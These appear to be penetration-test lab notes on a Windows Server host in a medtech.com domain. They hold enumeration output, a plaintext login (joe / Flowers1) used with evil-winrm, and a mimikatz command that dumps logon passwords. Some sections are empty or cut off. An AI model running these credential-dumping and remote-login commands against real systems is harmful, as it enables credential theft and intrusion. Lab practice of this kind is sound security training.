# 172.16.X.11
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`

- C:\Users\joe\Desktop\local.txt
- C:\Users\Administrator\Desktop\proof.txt
# Accounts
### joe / Flowers1
`evil-winrm -i 172.16.213.11 -u joe -p Flowers1`   
`whoami /priv`
```
Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```
`whoami /groups`
```
Group Name                           Type             SID          Attributes
==================================== ================ ============ ===============================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.141.97 --top-ports 1000`
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
`sudo nmap -A -T4 -p- 172.16.213.10`
```

```
## Local Users
`Get-LocalUser`
```
Name               Enabled Description
----               ------- -----------
Administrator      True    Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scenarios.
```
## Local Groups
`Get-LocalGroup`
```
Name                                Description
----                                -----------
Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
Administrators                      Administrators have complete and unrestricted access to the computer/domain
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the enterprise
Cryptographic Operators             Members are authorized to perform cryptographic operations.
Device Owners                       Members of this group can change system-wide settings.
Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.
Event Log Readers                   Members of this group can read event logs from local machine
Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.
IIS_IUSRS                           Built-in group used by Internet Information Services.
Network Configuration Operators     Members in this group can have some administrative privileges to manage configuration of networking features
Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
Performance Monitor Users           Members of this group can access performance counter data locally and remotely
Power Users                         Power Users are included for backwards compatibility and possess limited administrative powers
Print Operators                     Members can administer printers installed on domain controllers
RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Sessio...
RDS Management Servers              Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers ...
RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This gr...
Remote Desktop Users                Members in this group are granted the right to logon remotely
Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
Replicator                          Supports file replication in a domain
Storage Replica Administrators      Members of this group have complete and unrestricted access to all features of Storage Replica.
System Managed Accounts Group       Members of this group are managed by the system.
Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications
```
## System Info
`systeminfo`
```
Host Name:                 FILES02
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-10000-00001-AA704
Original Install Date:     9/28/2022, 8:41:26 AM
System Boot Time:          3/3/2025, 6:47:37 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,275 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 4,154 MB
Virtual Memory: In Use:    645 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    medtech.com
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB5004330
                           [02]: KB5005039
                           [03]: KB5005552
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.213.11
                                 [02]: fe80::f8e9:6d3f:9b8:cbbb
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
## Routes
`route print`
```
===========================================================================
Interface List
  6...00 50 56 86 49 7a ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   172.16.213.254    172.16.213.11     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     172.16.213.0    255.255.255.0         On-link     172.16.213.11    271
    172.16.213.11  255.255.255.255         On-link     172.16.213.11    271
   172.16.213.255  255.255.255.255         On-link     172.16.213.11    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link     172.16.213.11    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link     172.16.213.11    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0   172.16.213.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  6    271 fe80::/64                On-link
  6    271 fe80::f8e9:6d3f:9b8:cbbb/128
                                    On-link
  1    331 ff00::/8                 On-link
  6    271 ff00::/8                 On-link
===========================================================================
Persistent Ro
```
## Netstat
`netstat -ano`
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       524
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1124
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1576
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2112
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       636
  TCP    172.16.213.11:135      172.16.213.254:54869   ESTABLISHED     900
  TCP    172.16.213.11:139      0.0.0.0:0              LISTENING       4
  TCP    172.16.213.11:5985     172.16.213.254:57599   TIME_WAIT       0
  TCP    172.16.213.11:5985     172.16.213.254:57601   TIME_WAIT       0
  TCP    172.16.213.11:5985     172.16.213.254:57603   TIME_WAIT       0
  TCP    172.16.213.11:5985     172.16.213.254:57605   TIME_WAIT       0
  TCP    172.16.213.11:5985     172.16.213.254:57606   ESTABLISHED     4
  TCP    172.16.213.11:57711    172.16.213.10:135      TIME_WAIT       0
  TCP    172.16.213.11:57712    172.16.213.10:49668    TIME_WAIT       0
  TCP    172.16.213.11:57713    172.16.213.10:49668    TIME_WAIT       0
  TCP    172.16.213.11:57714    172.16.213.10:49668    TIME_WAIT       0
  TCP    172.16.213.11:57715    172.16.213.10:135      TIME_WAIT       0
  TCP    172.16.213.11:57716    172.16.213.10:49668    TIME_WAIT       0
  TCP    172.16.213.11:57717    172.16.213.10:49668    TIME_WAIT       0
  TCP    172.16.213.11:57718    172.16.213.10:49668    ESTABLISHED     656
  TCP    [::]:135               [::]:0                 LISTENING       900
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       656
  TCP    [::]:49665             [::]:0                 LISTENING       524
  TCP    [::]:49666             [::]:0                 LISTENING       1124
  TCP    [::]:49667             [::]:0                 LISTENING       1576
  TCP    [::]:49668             [::]:0                 LISTENING       656
  TCP    [::]:49669             [::]:0                 LISTENING       2112
  TCP    [::]:49670             [::]:0                 LISTENING       636
  UDP    0.0.0.0:123            *:*                                    1108
  UDP    0.0.0.0:500            *:*                                    2120
  UDP    0.0.0.0:4500           *:*                                    2120
  UDP    0.0.0.0:5353           *:*                                    1220
  UDP    0.0.0.0:5355           *:*                                    1220
  UDP    0.0.0.0:56502          *:*                                    1220
  UDP    127.0.0.1:50199        127.0.0.1:50199                        1364
  UDP    127.0.0.1:61146        127.0.0.1:61146                        656
  UDP    127.0.0.1:61148        127.0.0.1:61148                        1516
  UDP    127.0.0.1:61653        127.0.0.1:61653                        2092
  UDP    172.16.213.11:137      *:*                                    4
  UDP    172.16.213.11:138      *:*                                    4
  UDP    [::]:123               *:*                                    1108
  UDP    [::]:500               *:*                                    2120
  UDP    [::]:4500              *:*                                    2120
  UDP    [::]:5353              *:*                                    1220
  UDP    [::]:5355              *:*                                    1220
  UDP    [::]:56502             *:*                                    1220
```
## Environment Vars
`Get-ChildItem Env:`
```
Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\joe\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   FILES02
ComSpec                        C:\Windows\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA                   C:\Users\joe\AppData\Local
NUMBER_OF_PROCESSORS           2
OS                             Windows_NT
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\joe\AppData\Local\Microsoft\WindowsApps
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL                23
PROCESSOR_REVISION             0102
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PSModulePath                   C:\Users\joe\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\joe\AppData\Local\Temp
TMP                            C:\Users\joe\AppData\Local\Temp
USERDNSDOMAIN                  medtech.com
USERDOMAIN                     MEDTECH
USERNAME                       joe
USERPROFILE                    C:\Users\joe
windir                         C:\Windows
```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
```

```

# Command History
```c
    // upload mimikatz
    .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
